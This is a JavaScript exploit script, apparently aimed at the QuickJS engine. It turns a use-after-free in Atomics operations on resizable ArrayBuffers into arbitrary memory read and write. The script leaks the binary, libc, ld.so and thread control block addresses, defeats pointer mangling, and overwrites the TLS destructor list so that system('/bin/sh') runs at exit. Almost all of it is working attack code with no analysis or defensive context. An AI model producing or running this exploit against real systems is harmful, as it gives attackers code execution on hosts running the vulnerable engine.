// Exploit v3 - Write fake entry using the vulnerability itself
import * as std from 'std';

function hex(n) {
    return "0x" + BigInt.asUintN(64, n).toString(16);
}

let keepAlive = [];

function read64(addr) {
    let triggerBuffer = new ArrayBuffer(56, { maxByteLength: 65536 });
    let triggerView = new BigInt64Array(triggerBuffer);
    let victimBuffer = null;

    let malicious = {
        valueOf: function() {
            triggerBuffer.resize(32768);
            victimBuffer = new ArrayBuffer(8);
            keepAlive.push(victimBuffer);
            return addr;
        }
    };

    try {
        Atomics.exchange(triggerView, 2, malicious);
        if (victimBuffer) {
            let victimView = new BigInt64Array(victimBuffer);
            if (victimView.length > 0) {
                keepAlive.push(triggerBuffer);
                return BigInt.asUintN(64, victimView[0]);
            }
        }
    } catch (e) {}
    keepAlive.push(triggerBuffer);
    return 0n;
}

function write64(addr, value) {
    let triggerBuffer = new ArrayBuffer(56, { maxByteLength: 65536 });
    let triggerView = new BigInt64Array(triggerBuffer);
    let victimBuffer = null;

    let malicious = {
        valueOf: function() {
            triggerBuffer.resize(32768);
            victimBuffer = new ArrayBuffer(8);
            keepAlive.push(victimBuffer);
            return addr;
        }
    };

    try {
        Atomics.store(triggerView, 2, malicious);
        if (victimBuffer) {
            let victimView = new BigInt64Array(victimBuffer);
            victimView[0] = value;
            keepAlive.push(triggerBuffer);
            return true;
        }
    } catch (e) {}
    keepAlive.push(triggerBuffer);
    return false;
}

// Create and leak a controlled buffer's address
function createAndLeakBuffer(size) {
    // Create a trigger buffer
    let triggerBuffer = new ArrayBuffer(56, { maxByteLength: 65536 });
    let triggerView = new BigInt64Array(triggerBuffer);
    let targetBuffer = null;
    let targetAddr = 0n;

    let malicious = {
        valueOf: function() {
            triggerBuffer.resize(32768);
            // Create the target buffer - its JSArrayBuffer header will go into freed slot
            targetBuffer = new ArrayBuffer(size);
            keepAlive.push(targetBuffer);
            return 0n;  // Read offset 16 (data pointer)
        }
    };

    try {
        // compareExchange to read old value (which should be the new buffer's data ptr)
        let old = Atomics.compareExchange(triggerView, 2, malicious, 0n);
        targetAddr = BigInt.asUintN(64, old);
    } catch (e) {}

    keepAlive.push(triggerBuffer);
    return [targetBuffer, targetAddr];
}

print("=== Exploit v3 ===\n");

// Leak addresses
let codePtr = 0n;
for (let trial = 0; trial < 200 && codePtr === 0n; trial++) {
    let triggerBuffer = new ArrayBuffer(56, { maxByteLength: 65536 });
    let triggerView = new BigInt64Array(triggerBuffer);
    triggerView[6] = 0x4141414141414141n;

    let malicious = {
        valueOf: function() {
            triggerBuffer.resize(32768);
            for (let i = 0; i < 5; i++) {
                keepAlive.push(new ArrayBuffer(8));
            }
            return 0xDEADDEADDEADDEADn;
        }
    };

    let malicious2 = {
        valueOf: function() {
            return 0xBEEFBEEFBEEFBEEFn;
        }
    };

    try {
        let result = Atomics.compareExchange(triggerView, 6, malicious, malicious2);
        let v = BigInt.asUintN(64, result);
        let low12 = v & 0xFFFn;
        if (low12 === 0xd40n && v > 0x550000000000n) {
            codePtr = v;
        }
    } catch (e) {}
    keepAlive.push(triggerBuffer);
}

if (codePtr === 0n) { print("[-] Failed"); std.exit(1); }
let binaryBase = codePtr - 0x109d40n;
print("[+] Binary: " + hex(binaryBase));

let printfGOT = binaryBase + 0x1150a0n;
let libcPrintf = read64(printfGOT);
let libcBase = libcPrintf - 0x60100n;
print("[+] Libc: " + hex(libcBase));

// Get ld.so and TCB
let environAddr = libcBase + 0x20ad58n;
let stackEnvp = read64(environAddr);

let envEnd = stackEnvp;
for (let i = 0n; i < 100n; i++) {
    if (read64(stackEnvp + i * 8n) === 0n) {
        envEnd = stackEnvp + (i + 1n) * 8n;
        break;
    }
}

let ldBase = 0n;
for (let i = 0n; i < 30n; i++) {
    let auxType = read64(envEnd + i * 16n);
    let auxVal = read64(envEnd + i * 16n + 8n);
    if (auxType === 0n) break;
    if (auxType === 7n) ldBase = auxVal;
}
print("[+] ld.so: " + hex(ldBase));

let rtldGlobal = ldBase + 0x38000n;
let dtvAddr = read64(rtldGlobal + 0x10a0n);

let tcbAddr = 0n;
for (let addr = dtvAddr - 0x1000n; addr < dtvAddr && tcbAddr === 0n; addr += 0x80n) {
    let val = read64(addr);
    if (val === addr && val !== 0n) {
        let val10 = read64(addr + 0x10n);
        let val28 = read64(addr + 0x28n);
        if (val10 === addr && (val28 & 0xFFn) === 0n && val28 !== 0n) {
            tcbAddr = addr;
        }
    }
}
print("[+] TCB: " + hex(tcbAddr));

let ptrGuard = read64(tcbAddr + 0x30n);
print("[+] Ptr guard: " + hex(ptrGuard));

let systemAddr = libcBase + 0x58750n;
let binShAddr = libcBase + 0x1cb42fn;
print("[+] system: " + hex(systemAddr));
print("[+] /bin/sh: " + hex(binShAddr));

// PTR_MANGLE with proper unsigned handling
let xored = BigInt.asUintN(64, systemAddr ^ ptrGuard);
let mangled = BigInt.asUintN(64, (xored << 17n) | (xored >> 47n));
print("[+] Mangled: " + hex(mangled));

let linkMap = read64(rtldGlobal);
print("[+] LinkMap: " + hex(linkMap));

// Create fake entry buffer and leak its address
print("\n[*] Creating fake entry buffer...");
let [fakeBuffer, fakeAddr] = createAndLeakBuffer(64);

if (fakeAddr === 0n || fakeAddr < 0x500000000000n) {
    print("[-] Failed to leak buffer address: " + hex(fakeAddr));
    // Try again
    for (let i = 0; i < 10; i++) {
        [fakeBuffer, fakeAddr] = createAndLeakBuffer(64);
        if (fakeAddr > 0x500000000000n && fakeAddr < 0x700000000000n) break;
    }
}

print("[+] Fake entry addr: " + hex(fakeAddr));

if (fakeAddr === 0n || fakeAddr < 0x500000000000n || fakeAddr > 0x700000000000n) {
    print("[-] Invalid address, aborting");
    std.exit(1);
}

// Write fake entry using the buffer's view
let fakeView = new BigInt64Array(fakeBuffer);
fakeView[0] = mangled;      // func (mangled system)
fakeView[1] = binShAddr;    // obj (/bin/sh)
fakeView[2] = linkMap;      // map
fakeView[3] = 0n;           // next

print("\n[*] Fake entry contents:");
print("  func: " + hex(fakeView[0]));
print("  obj:  " + hex(fakeView[1]));
print("  map:  " + hex(fakeView[2]));
print("  next: " + hex(fakeView[3]));

// Verify by reading back
print("\n[*] Verifying via memory read:");
print("  func: " + hex(read64(fakeAddr)));
print("  obj:  " + hex(read64(fakeAddr + 8n)));

// Overwrite TLS destructor list
let dtorListPtr = tcbAddr - 0x58n;
print("\n[*] TLS dtor list at: " + hex(dtorListPtr));
print("  Current: " + hex(read64(dtorListPtr)));

write64(dtorListPtr, fakeAddr);
print("  After write: " + hex(read64(dtorListPtr)));

print("\n[*] Triggering exit...");
std.exit(0);
